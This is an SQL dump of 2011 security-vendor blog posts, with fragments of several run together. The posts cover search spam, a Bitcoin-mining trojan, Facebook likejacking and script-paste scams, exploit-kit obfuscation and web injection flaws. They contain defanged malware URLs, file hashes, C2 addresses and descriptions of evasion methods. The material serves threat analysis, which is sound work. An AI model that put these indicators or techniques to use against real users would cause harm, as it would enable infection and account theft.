Yandex shows only spam pages leading to fake stores in the first 2 pages  ChinaBaidu: 10 + 10 = 20  A lot of the spam pages are hosted on Chinese websites (for example):hxxp://nimende.com/notcjjff83/2011/08/29/ubuntu-10-04-lts-debut/  hxxp://bbs.52pk.com/thread-4913231-1-1.html  etc.      Spam pages and fake stores on Baidu  GermanyYahoo.de:  8 + 10 = 19  Bing.de: 7 + 10 = 17  Google.de: 0 + 2 = 2  Yahoo.de and Bing.de show very similar search results. The first result page shows mostly spam pages hosted on German sites, while the second pages contain spam in German languages on US .edu sites.    Yahoo.de gives worse results than the US site  Italy Google.it: 9 + 4 = 13 (only 4 search results on the second page)  Yahoo.it: 0      Italian spam pages on Google.it  Francevoila.fr: 0  google.fr: 2 + 10 = 12  Voila.fr and Google.fr give priority to web sites located in France. Most of the hijacked sites hosting spam are US University sites, hence they get a lower ranking.DuckDuckGoDuckDuckGo is a a one-man search engine that is gaining a lot of attention in the start up community. All results appear on the same page. Out of the first 20 results, 12 are spam pages.

Things have changed quite a bit in 2011.Cleaner results in popular searchesThe main target of search engine poisoning used to be popular searches found in the Google Hot Trends list. In several instances, popular searches contained up to 90% malicious links in the first ten pages. Currently, the number is between only one and three total malicious results in the first ten pages.Still, in July 2011, we identified 60 popular searches which contained at least one malicious spam link. They led to 35 different fake AV domains and three other domains serving different types of malware.Better protectionOne of the big changes in 2011 is that various players appear to be taking action much more quickly in stoping hijacked sites from infecting users. Google has cleaner results and hosting companies are in general, much faster at taking down malicious domains. Antivirus vendors also seem to have better protection for fake AV pages (the fact that these pages are changing very slowly must help).Webmasters seem to clean up their sites much faster as well. I believe that this is at least in part driven by better education as the threat of hijacked sites is now better known. Google has also helped to make webmasters aware of issues in their websites with warnings in Google Webmaster Tools, new warnings to users in search results and even direct e-mails to the owners of hijacked sites.As a result, the number of spam pages redirecting to a malicious sites that are either down or have been cleaned up has increased significantly.New targetsWhile the most popular searches are cleaner, a broader range of Google searches are now being poisoned. We recently demonstrated how Google News was redirecting users to malicious Java applets and Google Image search was poisoned for 6 months as well.Searches for buying software online remains 90% malicious, redirecting users to fake stores. There has been no significant improvement on that front, with 60 different fake store domains observed in July 2011. This is a problem that pretty much all search engines are facing.In total, I\'ve found over 1,000 spam search results leading to 150 different domains, most of them were malicious. This is a conservative number as I did not include malicious sites that were down (but were likely infecting users in the past) and malicious domains which prevented me from accessing their content.    Distribution of malicious domains per category  Fake AV is still thereAs you can see in the chart above, Fake AV sites are still present. They continue to look similar, both visually and in their source code. I\'ve spotted 35 different Fake AV domains in July 2011. The usual suspects were there: 10 co.cc sites (xyfybir.co.cc, wydrjim.co.cc, ttvzxiw.co.cc, etc.), 6 co.be (vrtwyqz.co.be, urtty.co.be, etc.), etc.    Fake AV page seen on 08/22/2011  Google has definitely made progress cleaning their search results and hosting companies have been doing their part as well. It has been some time since I have seen a mass Google Web search poisoning like the millions of  \"Hot Video\" pages that we observed last year. The only exception would be for searches related to malicious online software stores.I hope Google and other search engines vendors will continue to combat this threat.-- Julien', 'Malware', 'https://www.zscaler.com/blogs/research/blackhat-spam-seo-trends-2011');

It should not come as much of a surprise that malware has been designed to target abuse of this digital currency the same as any other (e.g., WoW Gold). Abuse can come in terms of theft and/or unauthorized Bitcoin mining - that is, solving computationally complex, \"proof-of-work\" problems (\"solving blocks\") to obtain a payout (based on an inflation algorithm).A Bitcoin account can be compromised if a computer with a wallet file can be remotely accessed by hackers or becomes infected by a virus or trojan. The first malware specifically targeting Bitcoin wallets was discovered June 16, 2011.  Current Bitcoin clients lack functionality for encrypting the wallet, however, the current development tree contains this feature and it will be available in the next release.[1]Recently, Symantec released a report on \"Trojan.Badminer\" - discovered 11 days ago, affecting most Windows systems that has the ability of running one of two Bitcoin mining programs depending on the infected host\'s configuration: Phoenix Miner (uses the system\'s GPU on graphics card) or RPC Miner -- the mined Bitcoins are then sent back to a location for the attacker to retrieve the generated currency.  When you think about it, this type of revenue generation is perfect for a botnet.It took me virtually no time at all to find a quick case study of such a malicious Bitcoin miner in our logs from yesterday.  Here is a live sample of one that we blocked:hxxp://img901.fileave.com/x8gp-on-59as.exeMD5: 8941ECF2586690701F0E748CCC954BB7Fortunately, it is detected by most A/V programs:Virustotal Report (26/44)The corresponding ThreatExpert report shows the malware connecting to 78.47.124.250 (belongs to Hetzner netblock) on port 8332 -- HTTP listener, assuming Botcoin dropzone.  Note: I doubt the ThreatExpert sandbox is able to process any of the code that would be designed to mine Bitcoins on the GPU. Further analysis of this particular sample shows that it makes its calls out to the domain: x.miners.in which does correspond to the previously mentioned IP in the ThreatExpert report.  A round-robin has been setup as follows to handle receipt of the Bitcoins:All of the IPs in the round-robin are to the Hetzner netblock - a great inexpensive hosting provider in Germany (sidenote: I recently tried to setup an account with them, and they required that I fax over a copy of my passport or drivers license for authenticity as part of their policy to prevent abuse - I did not want to share this and thus cancelled my account setup).Attempts to HTTP GET access the Bitcoin drop site show authentication required (likely for an admin console):Whereas, infected hosts do HTTP POST requests with the UserAgent strings like:Ufasoft bitcoin-miner/0.20 (Windows NT XP 5.1.2600 Service Pack 3)Ufasoft bitcoin-miner/0.20 (Windows NT 7 6.1.7600)The Ufasoft Bitcoin Miner (site) shows that it supports AMD/ATI, CUDA GPU (graphics card processor utilization)Obvious fake domain registration information provided to Name.com for registration of the miners.in domain:(microshits.us is a domain registered and hosted through gandi.net in France, registered to \"Dennis Timony\" in the US with billing to \"Gemblous Kim\" in Germany)Under the same fileave.com profile there are two PE executables with jpeg file extensions, possibly used in the same malware campaign:yavncc.jpegMD5: 291bfc99016ed4647862aeb896f741d1IRC Malware / injector (VT: 37/43)C2: 92.243.19.35  port: 1337yap.jpegMD5: a9c88a209db76deb4fe9f1a9f8f47971Palevo (VT: 27/43) While IRC-based malware and Palevo are older malware families, it looks as though the attacker is padding their portfolio of malware to include this newer, Bitcoin miner, form of revenue generation from their victims.Do a Google Search for Bitcoin miner in VirusTotal (Google dork) and you will see an influx of these varieties in late July through present.

In that post, I discussed a spike in Pastebin web transactions due to the LulzSec information drops and other controversial news within the information security community. To get a more precise view of when the spikes occurred, why and the general increase in Pastebin transactions, I wrote a script to automate the process of collecting daily statistics from our web transaction logs to Pastebin. Below are the results.\r\n \r\n\r\nFor Q2 2011 (April 1 - June 30), the a graph of the daily Pastebin usage looks like:\r\n\r\n\r\n\r\n\r\nYou can see from the trend-line that transactions to Pastebin increase about 200% throughout Q2. This increase has been due in part to some of the recent stories dealing with information being leaked out onto the Internet through Pastebin from LulzSec. However, surprisingly that was not the reason for the largest spike seen thus far - the reason for the significant spike on May 12 occurred due to privacy concerns surrounding Google\'s social networking site (see below for the link to the Pastebin paste). You can also see the cyclic-nature of the work week, since this traffic is from corporate, enterprise clients (i.e., the 2-day lulls are the weekends). The notable stories corresponding with the spikes seen in the above chart are as follows:\r\n\r\n	May 12-13: Google Social Circles privacy violation\r\n	June 13-15: LulzSec versus Bethesda & Senate.gov\r\n	June 20-22: LulzSec (UK Census and Operation Anti-Security) and Dropbox vulnerability disclosure\r\n	June 27: Dossier on LulzSec / gn0sis\r\n\r\nFollowing Q2, some of the LulzSec activity has settled down, so with the exception of two spikes in July, a slight overall decrease has been seen in recent Pastebin transactions versus Q2. This is what the July 1 to present chart looks like:\r\n\r\n\r\n\r\n\r\nThere are two prominent spikes during this timeframe:\r\n\r\n \r\n\r\n\r\n\r\n	July 1st: Anonymous / Lulz attacks against Arizona law enforcement (link1, link2)\r\n	July 21st: Anonymous / Lulz statement to FBI and law enforcement (link)\r\n\r\n\r\n\r\nA interesting side note - Pastebin changed it\'s IP from 173.236.52.197 to 184.154.125.14 on July 2nd - both are SingleHop netblocks (the DNS PTR record for the first IP is to m1221.sgded.com and the second is to s1.jeroenvader.com). The reason for doing this is unclear, perhaps it was an server upgrade.\r\n\r\n \r\n\r\nThere were many other Anonymous / Lulz Patebin pastes that occurred in the timeframe of this analysis -- I only listed pastes that were the cause for spikes seen within our customer traffic.\r\n\r\n \r\n\r\nThere is no question that the Anonymous / Lulz pastes to Pastebin increase the visits and traffic volume to the site ... driving factors for online revenue. One website revenue analysis site estimates that Pastebin receives about 7.3 million page views a day and has an estimated worth of almost $3 million USD based on this traffic volume. It is certainly interesting to witness this conflict of interest: Pastebin (and yes other web services like Twitter) are being used as popular soap boxes for illegally communicating sensitive / stolen information while at the same time collecting revenue from its related traffic. If Pastebin were to crack down hard on removing this content they would effectively be loosing their biggest cash cow. The Anonymous / Lulz pastes remain live on the Pastebin site -- if interested, here is Pastebin\'s acceptable use policy. One could argue that with the open avenue of communication that is the web, groups like Anonymous / Lulz would just use a different service or start their own so why bother cracking down, just collect the traffic (revenue) and be happy. Others would argue to do what is \"ethically right.\"', 'Analysis', 'https://www.zscaler.com/blogs/research/pastebin-trend-cont');

Following this, I provided some of the reasons why the web has not switched to SSL-only yet. There have been some improvements since, notably Google+, which works only over HTTPS, and from Twitter.    But those are very small steps. A lot more needs to be done.    SSL by default    One trend involves offering HTTPS as a new option. Facebook and Twitter took this path. Unfortunately, the option is usually disabled by default.

Facebook    While Facebook has fixed the 2 bugs I mentioned in the earlier post - SSL: the sites which don\'t want to protect their users, it is practically impossible to use HTTPS on Facebook. The problem arises from the fact that the use of SSL breaks most of the applications I\'ve tried on the platform. I used to get error messages, now users are warned that they need to switch to HTTP. They have to logout, and login again, to get HTTPS back.       	  		  			  		  		  			Most Facebook Apps cannot be used with HTTPS  		  	    HTTPS cannot be used for popular applications like CityVille from Zynga. I doubt many users will take the hassle to logout/login constantly to switch back to SSL.      Insecure cookies    I\'ve seen HTTPS implemented incorrectly on many sites, including Facebook. The main purpose of HTTPS is to hide the user cookies, so that tools like Firesheep cannot be used to hijack a user session. That means the HTTPS cookie should never be sent over HTTP. There are two ways to achieve this:    	Use the secure keyword when sending a cookie with Set-Cookie. This mean the cookie can be sent by the client only over HTTPS  	Use a different sub-domain that support HTTPS only (like encrypted.google.com) and restrict the cookie to this sub-domain    Otherwise, when the user connects to the website over HTTP the user session is vulnerable. Unfortunately, Facebook uses the exact same cookie over HTTP and HTTPS, without securing it. If you type \"facebook.com\" in your address bar, you will send your cookie in clear text, even if you are then redirected to https://www.facebook.com/ and simply visiting a site that uses a Facebook widget, a Like button for example, leaks your user session in plain-text, even if you check the \"Secure (HTTPS)\" option in your profile. Nowadays, it is a challenge to not visit a website that does not contain any element from Facebook...       	  		  			  		  		  			My Facebook cookie leaked on a random web site (Like widget)  		  	      In the end, it does not really matter whether you use HTTPS or not for Facebook. Your Facebook cookie will be leaked when visiting other websites anyway.    Google    Google did the right thing with Google+. The website works with HTTPS only and there is no way to use HTTP. User cookies cannot be sent in clear text.    You can also use their search engine over HTTPS, unlike Bing, which does not offer a secure alternative.    But Google still has some work to do on the rest of their current web applications. For example, the Google Personal Home Page cannot be accessed over HTTPS (users get redirected to HTTP) and Adsense, the major adverting network, does not support HTTPS, which leads to a Mixed HTTP/HTTPS warning for sites would would like to use SSL.    Mobile    The situation is even worse in the mobile space. Most of the applications used on smartphones and tablets need to contact a web server to function: to retrieve advertising (Admob/Adsense Mobile), to get data from a web service, etc. But there is no way for the user to know whether sensitive information is sent over HTTP or HTTPS. There is no UI element equivalent to the lock shown in browsers and no visibility into the URLs. Researchers have illustrated that mobile developers cannot be trusted to secure communications, as all too often, they send user credentials in plain text.    While some websites have taken a few steps to protect the users, there is still a great deal to do. HTTPS should be enabled by default on all new web sites requiring user authentication. HTTPS should not just be required for login, it should also be required for all requests sent with a cookie.    -- Julien', 'Encryption', 'https://www.zscaler.com/blogs/research/web-has-still-not-switched-ssl-only');

Split the IP address into four octets - 91, 193, 72 and 70.\r\n\r\n1) Select decimal mode and type 91 in your calculator.\r\n2) Then click on HEX mode. It will give you hex value 5B for first octet. Write that down and do the same for the other three octets.\r\n3) You will ultimately get “5BC14846” for all 4 octets.\r\n4) The string above is in hex format. Select HEX mode in the calculator and copy paste the hex string.\r\n5) Select decimal mode and you will then get “1539393606” which is the DWORD form of the IP address.\r\n6) Type this DWORD in your browser and you will be taken to address “91.193.72.70”.\r\n\r\n \r\n\r\n \r\n\r\nHere are some other malicious URL’s we have seen in the wild in DWORD format:\r\n\r\n \r\n\r\nhxxp://1496251283/dhj8v.class\r\n\r\n \r\n\r\nhxxp://3560666344/options.class\r\n\r\n \r\n\r\nFurther research shows that these URL’s are exploiting Java vulnerability (CVE-2010-4452) to download malware onto the victim machine. \r\n\r\n \r\n\r\nWhat’s your DWORD form?\r\n\r\n \r\n\r\nUmesh', 'Evasion/Stealth', 'https://www.zscaler.com/blogs/research/malicious-urls-using-dword-formatted-ip-addresses');

Not a huge botnet at all - it was interesting to see that all of the infections were from Australian hosts (iinet.net.au, exetel.com.au, tpgi.com.au, internode.com.au, telstra.net). It is interesting that this particular threat seems isolated to one particular region.                  Original Post:    During the course of analysis to try to identify some interesting beaconing behaviors, I noticed some “low” and “slow” activity tied to a malware threat that didn’t have a whole lot of information documented in one place. I’ll try to tie it all together in this post. The beaconing activity is “low” in that very little network activity takes place (generally, saw a 108 byte request and only 260 bytes of response data), and “slow” in that the beacons are not very frequent or regular (though this may have to do with the uptime of the victim too). For example, I saw an exact 3-hour beacon followed by another over 15 hours later.    In the activity observed, I saw the requests going to:    aunznewl1.com, resolving to 199.71.212.157  aunznewl1.net, did not resolve    Note: It appears in most instances of the malware it tries to beacon to a .com / .net domain pair – but in the cases that I’ve seen only the .com is actually registered. I went ahead and registered the above .net domain and will monitor and update this post with any data I find.    URL paths:    /newuser.php  /comm.php?userid=XXXXXXXX_XXXXXX    Note: the user id appears to be a historical timestamp (DDMMYYYY_HHMMSS) from 2011, possibly related to the time of infection. The above two URL paths are quick and easy ways of identifying infections in your network – I didn’t see these patterns in EmergingThreats.    Doing Google searches for the above two domains does not reveal much of anything. However, there is some open-source information that can be pulled-in to tie this to an identified malware family:    To start with, there is a “Trojan.Win32.Generic” GFI Sandbox report that identifies HTTP beaconing to the domain pair thausyn2.com and thausyn2.net on the same IP above. Using the MD5 from this report, we can pull a VirusTotal report which shows it to be detected as a Trojan by 19/41 A/V vendors. Doing a bit more digging shows a few additional reports, for example a Malware-Control report from late June 2011 showing that the malware family is frequently classified as “Ambler” or “Amber” Trojan Spy variant – which can steal passwords and log key-strokes. This is an older malware family, and appears to have some ties to Russia. While it is an older malware family, this current variant shows that it is still in use and exhibits some different patterns possibly allowing infections to fly under the radar.    I downloaded a very recent version of malware from one of the involved domains, and it has very poor A/V detection:  MD5: 2936b54a55615ae85f585c3c6dc1f81b  V/T report: 4/43  The binary itself ends the file with a series of “PADDINGPADDINGXX” strings … which a quick Google shows some malware reports from Anubis.

We can now copy and paste this function and copy the variables, which use this function into a new HTML file called “test.html”. The goal is to identify return values from this function. For this function to work, we also need two variables, “Y” and “v”, which are used inside this function. These variables are available from the main script. Copy and paste those variables into the D() function. Now, we will call another JavaScript function called “alert()” to display the return value. Open the new “test.html” file we created in Internet explorer.

In such a situation, phsishers do not need to blast e-mails to random Brazilian e-mail accounts.

DNS poisoning also renders virtually all browser phishing defenses useless.

It can be very hard for the user to realize that this is a phishing site because it looks exactly like the real site, and the URL shows the correct domain.    In this attack, there were only 2 oddities that an advanced users could spot. First, the phishing site did not support HTTPS traffic. Advanced users should know that credentials should be sent over secure HTTPS sessions only and banking sites always redirect to HTTPS enabled pages when the user must log in.

I listed a few examples on our new blog, Zscaler Analyst Scrapbook. I\'ll go into more detail in this post.    A Google search for \"Dad walks in on Daughter.. EMBARRASSING!\" shows hundreds of spam pages. They are mostly new domains, set up just for the purpose of scamming users.       	  		  			  		  		  			Google search shows spam pages  		  	      Some of the domains identified are:    	the-ping.org  	t401.org  	ectoplax.info  	20yearstimephoto.info  	20yearsphoto.info       Links can also be found by searching directly on Facebook:      	apps.facebook.com/cooljoysole/  	apps.facebook.com/dadwalksin/  	apps.facebook.com/fgdfhgdfgdf/    	www.facebook.com/pages/Dad-walks-in-on-Daughter-Embarrassing/217239648303953    Facebook users should remember that Facebook applications are not necessary reviewed by the Facebook staff, and can be harmful.    Besides being wide spread, this spam is interesting because it shows the wide variety of scams and spam associated with Facebook. Here are a few.    Like-Jacking    A very common technique used with Facebook spam involves likejacking. The spammer entices users to click on a link or image, often on the premise of watching a funny video. However, the page contains a hidden Like button that is unknowingly triggered by the user. The Like button is placed in a hidden iFrame or hidden DIV tag that follows the mouse.    This technique is used to spread the spam page via Facebook profiles to get more users to visit the page. This likejacking technique can be found, for example, on gadgetera.net or t401.org.       	  		  			  		  		  			Fake video layer hiding a Like button  		  	      On these pages, the likejacking technique used is somewhat unique: 23 Like Buttons are placed in the center of the video, below what looks like the play button. The opacity is set to 0, meaning these buttons are totally transparent and cannot be seen. When a user believes he is clicking on the play button, he is actually clicking on one of the like buttons.       	  		  			  		  		  			Like buttons rendered visible  		  	      You can check the details in this video:           Script injection    This second example is much more harmful. The attackers ask users to copy and paste Javascript code into their Browser URL bar. The Javavascript has full access to contents in the open browser tab. It can grab the user session cookie and send it to the attacker. This gives the attacker full access to and control of your Facebook account.       	  		  			  		  		  			Script injection  		  	    In the example, the attackers didn\'t try very hard to hide their intentions. They load the malicious Javascript from a page called owned.php!    These types of script injection used to be done through cross-site scripting (XSS), or other vulnerabilities. Now unfortunately, attackers are finding that they can bypass security protections as users are willing to do anything, including willingly executing malicious code!    Comment-Jacking    Instead of using a Like button to spread a page, spammers can also use comments. On hxxp://kingsoz.org/, the user is asked to enter a captcha to access the video. The result is actually entered into a Facebook comment box (you can see the \"comment\" button).       	  		  			  		  		  			User asked for a Captcha  		  	    Similar to the \"Like\" button, this adds content to the victim\'s Facebook profile and shows up in his friend\'s News page.       	  		  			  		  		  			Spam link on my user profile after visiting hxxp://kingsoz.org/  		  	      Survey, Software Installation    Getting the spam page hosted in a victim\'s Facebook profile is only the first step for a scammer. Ultimately, they want to make a few bucks from each visitor. A common technique used involves asking visitors to fill out a survey, install software, or to click on advertising to verify that they are in fact a human and not an automated script. The spammers get paid for each action.             After getting 5 spam pages added to my profile, filling out 3 surveys and getting my Facebook account stolen, I was still not able to watch this video :-)    -- Julien', 'Analysis', 'https://www.zscaler.com/blogs/research/dad-walks-daughter-embarrassing-facebook-scams');

Umesh recently blogged about seeing a spike in the usage of the Blackhole exploit kit. This exploit kit targets multiple known vulnerabilities present in a victim\'s browser, increasing the probability of a successful compromise. Various exploit kits differ in the way they are packaged, designed and implemented. The most distinguishing factor among different exploit kits is how exploits are obfuscated, in order to bypass various security controls.    Recently, I have noticed a significant increase in the usage of the Incognito exploit kit. Similar to the Blackhole exploit kit, Incognito also targets vulnerabilities in Java and Adobe products. Another item that stands out to differentiate among these exploit kits is the URL patterns used. Most of the time, the URL pattern remains same within a given exploit kit. A quick look at malwaredomainlist shows the usage of common patterns used in URLs associated with Incognito.    Common URL patterns for Incognito:        Code obfuscation (Formatted for good view),                 De-obfuscation of the aforementioned JavaScript, shows the exploit kit carrying out different attack vectors.

Let’s look at the news page:     The above news site contains the malicious obfuscated JavaScript code at the top of the page.

Additionally, the text which the victim inputs, is not verified against the CAPTCHA string, but instead is used as a comment, and the malicious post is then added to the victim’s wall to further spread the scam to the victim\'s other friends.

Yesterday, I posted a blog about a recent scam being circulated on the Facebook network and only a few hours later, we uncovered yet another one. The goal of this scam remains the same as earlier one, namely to coerce Facebook users into completing various surveys which in turn generate money for the scammer. The interesting fact about this scam is that it is not only posting the malicious message to the wall of the victim’s friends, but it also gets a list of online friends to send them chat message like “hey you are still there?Check my wall for the link ^_^ It showed me who viewd my profile. Amazing :p\" with a link to the malicious domain. Here is what the wall posts look like:  When a user clicks on the links in the message, they are presented with a fake pop up displaying how many friends are supposedly viewing the victim’s profile. Here is a screenshot:Remember, this is fake message and each time it is accessed, it simply generates a random number– this has nothing to do with actual users viewing your profile (something that Facebook does not share). The page also suggests that the user must copy and paste JavaScript into the address bar, which will of course execute the JavaScript in the context of the victim. This is similar to the earlier scam. Once the user runs that malicious code, they are presented with some fake messages requiring that they undertake surveys or view additional messages: Here are the screenshots:     As mentioned, the attack also sends chat messages to online friends in order to further spread the attack. Here is the screenshot of the associated source code:The malicious code also forces the victim to become a fan of “OSAMA” Facebook pages. Here is the screenshot of that code:Facebook is currently losing this cat and mouse game. As quickly as they take scams down, new ones appear and take their place, each time evolving the tactics slightly to evade detection. This is second scam we uncovered in only a few hours. Facebook needs to do a better job protecting its users. Both of these scams use the same techniques of social engineering users into pasting JavaScript into the URL bar – something that we’re seeing on a more regular basis and something that would never be required by a legitimate page.Nasty Scams!!!

The messages arrive with embedded Flash video and different messages such as “WTF!! You look so stupid in this video” or “yo, why are you on this video” etc. Below is a screenshot of such messages:\r\n\r\n \r\n\r\nThe post displays fake meta data showing the number of “Views”, “Likes”, etc. to make the posts appear more genuine.

This JavaScript file not only posts the same flash video message to user’s wall, but also their friends walls. Here is partial screenshot of “config.js” file:\r\n\r\nThe above code contains all the configuration settings for spreading this message with different text messages and different domains.

Those techniques are aimed at bypassing detection devices (IDS, antivirus, etc.), rather than hiding the source code. The creators focus on making life difficult for those tasked with writing signatures to detect the malicious content.    HTML encoding and white space    The FakeAV pages often encode random HTML elements using HTML entities.    	  		  			  		  		  			Use of HTML entities in the TITLE tag  		  	    This is a very common and basic evasion techniques.

This causes problems for string matching algorithms.    JavaScript and CSS encoding    While most of the CSS information is contained in external files, some inline CSS is included within the HTML document.

We received numerous comments and emails about the same threat being found on various websites from our blog readers. The toolkit has been linked to from numerous compromised websites, which in turn have victimized a number of their visitors. Attackers are injecting malicious iframes into the legitimate sites, which in turn redirect to malicious websites hosting the Blackhole Incognito exploit kit. We have observed and identified such compromised sites due to Zscaler’s advanced security features in our solution. The latest victim is Lenovo, India whose website for product warranties http://www.lenovowarranty.co.in/ has been compromised, redirecting visitors silently to the Blackhole Incognito exploit kit.

They are well know vulnerabilities, with well-known solutions. As we\'ve seen in recent weeks, even well-established tech companies are not immune to these basic flaws:\r\n\r\n	MySQL was compromised by SQL Injection\r\n	Wordpress.com was compromised by an HTML Injection/Cross-Site Request Forgery\r\n	Facebook was hit by a worm exploiting an XSS vulnerability\r\n	Barracuda Networks was compromised by SQL Injection\r\n	Twitter had an HTTP Response Splitting flaw\r\n\r\nThese flaws go by different names, but there cause and consequences are about the same. They are caused by insufficient user input sanitization, and result in malicious code being executed in the browser of the user visiting the site.\r\n\r\nI believe one of the reason these flaws are still present in new websites is due to the fact that their exploitation and consequences are not fully understood. Here are few misconceptions I have heard.\r\n\r\nXSS is simply about popups\r\n\r\nProof-of-concept for XSS flaws often consists of showing a JavaScript alert popup being displayed. This is just for demonstration purposes. A successful XSS injection can insert any JavaScript into the page, which can, amongst other things:\r\n\r\n	steal user credentials (login, password, session, etc.) and other confidential information (credit card number, mailing address, etc.)\r\n	hijack administrator sessions\r\n	force the download of malicious executables\r\n	run other types of code: Flash, Java, ActiveX, etc.\r\n\r\nSQL injection is all about reading data\r\n\r\nSQL Injection is not only used to dump a database, or to login without valid user credentials. A lot of web applications, like Wordpress, store the site content into a database. If an attacker get write access to the database, he can insert malicious code which will then be rendered for all users.\r\n\r\nUsers are at fault for not being diligent\r\n\r\nAnother belief is that a user must click on link that contains the XSS, CSRF of HTML infection in order to be affected. Since the \"bad\" content is often shown in the URL the user clicks on, users should simply be more careful.\r\n\r\nFirst, \"bad\" links can be hidden with a URL shortener, for example and users may not be aware were they will be redirected. Second, all attacks are not necessarily transient. Malicious content can be inserted by one user, or the attacker, and displayed to all other users via a persistent XSS or HTML Injection flaw. It is the responsibility of the webmaster to protect users. This responsibility should not be placed on each user.\r\n\r\n\r\nA good blacklist will do the trick\r\n\r\nUser input filtering is often performed by a blacklist: allow anything, except a few dangerous strings. Unfortunately with HTML and JavaScript, there are too many ways to do the same things. Here are a couple of examples\r\n\r\nConditional comments\r\n\r\nHTML comment should be safe, right? Wrong. Internet Explorer actually interprets the content of HTML comments called conditional comments. These 2 lines will make Internet Explorer load and execute JavaScript for evil.com:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			These lines are not interpreted as comments by IE\r\n		\r\n	\r\n\r\nConditional comments for Internet Explorer also exist for Javascript:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			document.write is executed by Internet Explorer\r\n		\r\n	\r\n\r\n\r\nXSS can hide anywhere\r\n\r\nA XSS attack does not require the addition of a new script tag on a page. It can hide in a link, tag attributes, CSS, etc.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Examples of harmful JavaScript/HTML insertion\r\n		\r\n	\r\n\r\nEncoding\r\n\r\nDon\'t forget about HTML encoding, JavaScript encoding, JavaScript obfuscation, ASCII-7, UTF with null characters, etc.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Some examples of encoding\r\n		\r\n	\r\n\r\n\r\n\r\nIt\'s pretty much impossible to get a comprehensive list of dangerous strings. Instead, a tight whitelist of authorized strings and/or characters should be used first, and only supplemented with a blacklist as needed.\r\n\r\nI hope that the high-profile attacks that happened recently will push web developers to pay more attention to the code injection vulnerabilities. Many programming frameworks include libraries and functions to take care of most of these issues. Hopefully they will be used everywhere user input is received and displayed. Don\'t ever trust external input!\r\n\r\n-- Julien', 'Analysis', 'https://www.zscaler.com/blogs/research/cross-site-scripting-xss-cross-site-request-forgery-csrf-sql-injection-html-injection-etc');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (405, 'Will Mobile Apps Be The Achilles\' Heel Of Web Security?', 'Michael Sutton', 'April 21, 2011', 'Inspired by a post yesterday from Alasdair Allan and Pete Warden discussing how the iPhone records and stores geo-location data, I decided to poke around to see what other interesting security issues may be lurking among the iPhone backup files. I\'ve been concerned for some time that we\'re due for a flood of security issues in mobile apps, given the explosive growth that we\'ve seen, with thousands of developers rushing to profit from the app store model. Successful web services such as Twitter, Dropbox, Evernote, etc. have willingly provided APIs to allow integration with third party technologies, including mobile apps. This greatly enhances the value of such services, but unfortunately, the services then entrust third parties to implement appropriate security controls so as not to expose confidential user data. Unfortunately, this is not always achieved.    iOS devices record backup archives when the device is synced to iTunes. On OS X, the archive is stored in the following directory:    /Users/[Username]/Library/Application Support/MobileSync/Backup/    Apple makes some effort to obfuscate the content by archiving everything into files with titles comprised of seemingly random strings. However, unarchiving the content back to its original form is a trivial task using a tool such as the iPhone Backup Extractor. Once unpacked, you will find a variety of content including documents and images, but most configuration data is stored within either SQLite database files or .plist files. The former can be read with any SQLite viewer such as SQLite Database Browser, while the latter is simply an XML file that can be viewed in a text editor.    JotNot Scanner Pro    Let\'s look at a particularly egregious example of poor application security practices. JotNot Scanner Pro is an iPhone app that I rely on heavily during business travel. It is a popular app, first released over two years ago, which essentially turns your iPhone into a document scanner and allows you to store the scanned content either locally or upload them to a host of web based storage services. While Apple doesn\'t release sales figures for individual apps, with over 3,600 people having reviewed all versions of JotNot on iTunes, it\'s clear that this is a broadly adopted application.    The JotNot Pro backup archive is labelled com.mobitech3000.JotNotIPhone. Upon extracting the archive we see a directory structure with the Documents folder containing copies of previously scanned documents, while various configuration settings for the application can be found in the Library folder. The file that we\'re interested in is /Library/Preferences/com.mobitech3000.JotNotIPhone.plist:      	  		  			   		  		  			   		  	    This .plist file is an XML document, which includes version information and various user defined settings, including usernames and passwords for the third party storage services that the user has enabled to upload scanned documents to. JotNot works with a variety of online services and must authenticate with these services in order to upload documents on behalf of the app user. Unfortunately, the authentication credentials stored for Evernote, Google Docs, Apple\'s iDisk and any WebDav enabled server are stored in plain text. Therefore, anyone that gained access to this backup file, would then have your username/password for these services. It is particularly concerning that Google Docs and Apple\'s Mobile Me are on this list. Both services leverage single sign-on for their various online services, so knowledge of these credentials would also provide access to Gmail and Apple\'s MobileMe email service.    Thoughts     As an end user, you\'ve followed best practices to keep your access credentials safe. You\'ve chosen a complex password. You change it regularly and never share it with anyone. Unfortunately, all of that effort goes out the window when you trust an app with your data, which doesn\'t store it securely. In this situation, if you\'re a JotNot user and someone gains access to your computer either locally or remotely, they now have access to web services where you store confidential data such as documents, photos, receipts, etc. They may also gain access to your email accounts. Unfortunately, as a user, you really have no way of knowing which apps have incorporated appropriate security controls. Despite the fact that Apple must bless all apps before hosting them in the App Store and is very willing to take a 30% cut for doing so, they\'re clearly concerned more with blessing the \'user experience\' as opposed to security. Storing passwords in clear text is security 101. If I can spot it in 15 minutes, surely they can have processes in place to identify and prohibit at least basic security issues. Web services should also be exposing APIs that don\'t accept usernames/passwords but rather tokens generated by the service to ensure that third party apps don\'t have the option to expose access credentials in the first place.    Why this isn\'t the first and won\'t be the last example of insecure mobile apps putting users at risk:       	Land Grab - Developers have realized the power of the mobile apps stores to generate profits and are rushing to get first mover advantage in each an every app category. Sadly, when developers are rushing to get products out the door, security is often left on the cutting room floor.  	New Technologies - iOS apps primarily leverage Objective-C as the programming language of choice for creating apps. This is a new language for many developers but thanks to user-friendly development tools, developers are able to produce mobile apps, even without a thorough knowledge of Objective-C.  	Gatekeeper - Apple is not ensuring that apps are secure before allowing them into the App store. Unfortunately, users don\'t realize this and are eagerly handing over passwords to apps that may or may not store them correctly.      Keep this in mind next time you\'re downloading the latest must have app. and handing over your passwords.    - michael', 'Analysis', 'https://www.zscaler.com/blogs/research/will-mobile-apps-be-achilles-heel-web-security');

